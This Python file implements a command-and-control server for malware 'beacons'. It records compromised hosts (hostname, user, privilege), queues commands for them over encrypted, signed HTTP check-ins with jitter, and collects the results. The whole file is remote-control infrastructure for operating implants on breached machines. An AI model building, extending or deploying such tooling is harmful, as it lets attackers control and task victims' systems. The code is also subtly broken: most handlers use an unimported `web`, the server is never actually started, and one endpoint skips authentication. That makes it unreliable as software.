"""Native beacon protocol with encrypted task queue and heartbeat."""
import asyncio
import base64
import hashlib
import hmac
import json
import logging
import os
import secrets
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger("c2.beacon")

C2_SECRET = os.getenv("C2_SHARED_SECRET", "").encode() or secrets.token_bytes(32)


@dataclass
class BeaconTask:
    id: str
    session_id: str
    command: str
    args: list = field(default_factory=list)
    timeout: int = 60
    created: float = 0.0
    status: str = "pending"
    result: Optional[str] = None
    error: Optional[str] = None


@dataclass
class BeaconSession:
    id: str
    hostname: str
    address: str
    os: str
    arch: str
    pid: int = 0
    username: str = ""
    privilege: str = "user"
    transport: str = "https"
    interval: int = 30
    jitter: int = 5
    last_checkin: float = 0.0
    first_seen: float = 0.0
    status: str = "alive"
    tasks: list = field(default_factory=list)
    results: list = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "id": self.id, "hostname": self.hostname, "address": self.address,
            "os": self.os, "arch": self.arch, "pid": self.pid,
            "username": self.username, "privilege": self.privilege,
            "transport": self.transport, "interval": self.interval,
            "jitter": self.jitter, "last_checkin": self.last_checkin,
            "first_seen": self.first_seen, "status": self.status,
        }


class BeaconProtocol:
    def __init__(self, secret: bytes = C2_SECRET):
        self._secret = secret
        self._sessions: dict[str, BeaconSession] = {}
        self._pending_tasks: dict[str, BeaconTask] = {}
        self._completed_tasks: dict[str, BeaconTask] = {}
        self._lock = threading.Lock()

    def generate_session_id(self) -> str:
        return secrets.token_hex(16)

    def derive_key(self, session_id: str, purpose: str = "enc") -> bytes:
        return hashlib.sha256(session_id.encode() + self._secret + purpose.encode()).digest()

    def encrypt_payload(self, session_id: str, data: dict) -> str:
        key = self.derive_key(session_id, "enc")
        payload = json.dumps(data, sort_keys=True).encode()
        iv = secrets.token_bytes(12)
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(key)
        ct = aesgcm.encrypt(iv, payload, None)
        return base64.b64encode(iv + ct).decode()

    def decrypt_payload(self, session_id: str, ciphertext_b64: str) -> Optional[dict]:
        try:
            key = self.derive_key(session_id, "enc")
            raw = base64.b64decode(ciphertext_b64)
            iv, ct = raw[:12], raw[12:]
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(iv, ct, None)
            return json.loads(plaintext.decode())
        except Exception as e:
            logger.warning(f"  Beacon decrypt failed: {e}")
            return None

    def sign_message(self, session_id: str, data: dict) -> str:
        key = self.derive_key(session_id, "hmac")
        payload = json.dumps(data, sort_keys=True)
        return hmac.new(key, payload.encode(), hashlib.sha256).hexdigest()

    def verify_signature(self, session_id: str, data: dict, signature: str) -> bool:
        expected = self.sign_message(session_id, data)
        return hmac.compare_digest(expected, signature)

    def register(self, info: dict) -> BeaconSession:
        with self._lock:
            sid = info.get("id") or self.generate_session_id()
            now = time.time()
            session = BeaconSession(
                id=sid,
                hostname=info.get("hostname", "unknown"),
                address=info.get("address", "0.0.0.0"),
                os=info.get("os", "linux"),
                arch=info.get("arch", "amd64"),
                pid=info.get("pid", 0),
                username=info.get("username", ""),
                privilege=info.get("privilege", "user"),
                transport=info.get("transport", "https"),
                interval=info.get("interval", 30),
                jitter=info.get("jitter", 5),
                last_checkin=now,
                first_seen=now,
            )
            self._sessions[sid] = session
            logger.info(f"  Beacon registered: {sid} ({info.get('hostname', '?')}@{info.get('address', '?')})")
            return session

    def checkin(self, session_id: str, address: str = "") -> Optional[BeaconSession]:
        with self._lock:
            session = self._sessions.get(session_id)
            if not session:
                return None
            session.last_checkin = time.time()
            session.status = "alive"
            if address:
                session.address = address
            return session

    def enqueue_task(self, session_id: str, command: str, args: list = None, timeout: int = 60) -> Optional[BeaconTask]:
        with self._lock:
            session = self._sessions.get(session_id)
            if not session:
                return None
            task = BeaconTask(
                id=str(uuid.uuid4()),
                session_id=session_id,
                command=command,
                args=args or [],
                timeout=timeout,
                created=time.time(),
            )
            self._pending_tasks[task.id] = task
            session.tasks.append(task)
            return task

    def get_pending_tasks(self, session_id: str) -> list[BeaconTask]:
        with self._lock:
            return [t for t in self._pending_tasks.values() if t.session_id == session_id and t.status == "pending"]

    def complete_task(self, task_id: str, result: str, error: str = ""):
        with self._lock:
            task = self._pending_tasks.pop(task_id, None)
            if not task:
                return
            task.status = "completed" if not error else "failed"
            task.result = result
            task.error = error
            self._completed_tasks[task_id] = task
            session = self._sessions.get(task.session_id)
            if session:
                session.results.append(task)

    def get_session(self, session_id: str) -> Optional[BeaconSession]:
        return self._sessions.get(session_id)

    def list_sessions(self) -> list[BeaconSession]:
        with self._lock:
            now = time.time()
            for s in self._sessions.values():
                if s.status == "alive" and now - s.last_checkin > s.interval * 4:
                    s.status = "stale"
                elif s.status == "stale" and now - s.last_checkin > s.interval * 12:
                    s.status = "dead"
            return list(self._sessions.values())

    def generate_checkin_url(self, session_id: str, base_url: str = "") -> str:
        return f"{base_url}/c2/beacon/{session_id}"


class BeaconHTTPServer:
    """Minimal async HTTP server for beacon C2 endpoints."""

    def __init__(self, protocol: BeaconProtocol, host: str = "0.0.0.0", port: int = 8443):
        self._proto = protocol
        self._host = host
        self._port = port
        self._server = None

    async def start(self):
        from aiohttp import web
        app = web.Application()
        app.router.add_post("/c2/beacon/register", self._handle_register)
        app.router.add_post("/c2/beacon/{session_id}/checkin", self._handle_checkin)
        app.router.add_post("/c2/beacon/{session_id}/result", self._handle_result)
        app.router.add_get("/c2/beacon/{session_id}/tasks", self._handle_tasks)
        app.router.add_get("/c2/health", self._handle_health)
        self._server = web.TCPSite(web.AppRunner(app), self._host, self._port)
        logger.info(f"  Beacon HTTP server listening on {self._host}:{self._port}")

    async def _handle_register(self, request):
        try:
            body = await request.json()
            info = self._proto.decrypt_payload("init", body.get("data", ""))
            if not info:
                return web.json_response({"error": "decrypt failed"}, status=400)
            sig = body.get("sig", "")
            if not self._proto.verify_signature("init", info, sig):
                return web.json_response({"error": "bad signature"}, status=401)
            session = self._proto.register(info)
            response = {"session_id": session.id, "interval": session.interval, "jitter": session.jitter}
            encrypted = self._proto.encrypt_payload(session.id, response)
            return web.json_response({"data": encrypted, "sig": self._proto.sign_message(session.id, response)})
        except Exception as e:
            return web.json_response({"error": str(e)}, status=400)

    async def _handle_checkin(self, request):
        session_id = request.match_info["session_id"]
        try:
            body = await request.json()
            data = self._proto.decrypt_payload(session_id, body.get("data", ""))
            if not data:
                return web.json_response({"error": "decrypt failed"}, status=400)
            sig = body.get("sig", "")
            if not self._proto.verify_signature(session_id, data, sig):
                return web.json_response({"error": "bad signature"}, status=401)
            session = self._proto.checkin(session_id, data.get("address", ""))
            if not session:
                return web.json_response({"error": "unknown session"}, status=404)
            tasks = self._proto.get_pending_tasks(session_id)
            task_list = [{"id": t.id, "command": t.command, "args": t.args, "timeout": t.timeout} for t in tasks]
            response = {"status": "ok", "tasks": task_list, "interval": session.interval}
            encrypted = self._proto.encrypt_payload(session_id, response)
            return web.json_response({"data": encrypted, "sig": self._proto.sign_message(session_id, response)})
        except Exception as e:
            return web.json_response({"error": str(e)}, status=400)

    async def _handle_result(self, request):
        session_id = request.match_info["session_id"]
        try:
            body = await request.json()
            data = self._proto.decrypt_payload(session_id, body.get("data", ""))
            if not data:
                return web.json_response({"error": "decrypt failed"}, status=400)
            sig = body.get("sig", "")
            if not self._proto.verify_signature(session_id, data, sig):
                return web.json_response({"error": "bad signature"}, status=401)
            task_id = data.get("task_id", "")
            result = data.get("result", "")
            error = data.get("error", "")
            self._proto.complete_task(task_id, result, error)
            return web.json_response({"status": "ok"})
        except Exception as e:
            return web.json_response({"error": str(e)}, status=400)

    async def _handle_tasks(self, request):
        session_id = request.match_info["session_id"]
        tasks = self._proto.get_pending_tasks(session_id)
        return web.json_response({"tasks": [{"id": t.id, "command": t.command, "args": t.args} for t in tasks]})

    async def _handle_health(self, request):
        from aiohttp import web
        return web.json_response({"status": "ok", "sessions": len(self._proto.list_sessions())})

    async def stop(self):
        if self._server:
            await self._server.stop()
